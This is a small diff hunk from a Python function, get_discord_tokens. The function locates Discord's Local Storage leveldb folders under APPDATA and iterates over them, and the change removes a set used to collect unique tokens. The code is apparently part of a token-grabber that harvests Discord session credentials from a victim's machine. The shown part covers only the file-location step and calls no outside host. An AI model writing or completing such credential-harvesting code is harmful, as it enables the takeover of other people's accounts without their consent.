@@ -17,8 +17,6 @@ def get_discord_tokens():
         os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),
     ]
 
-    unique_tokens = set()
-
     for leveldb_path in paths:
         if not os.path.exists(leveldb_path):
             continue
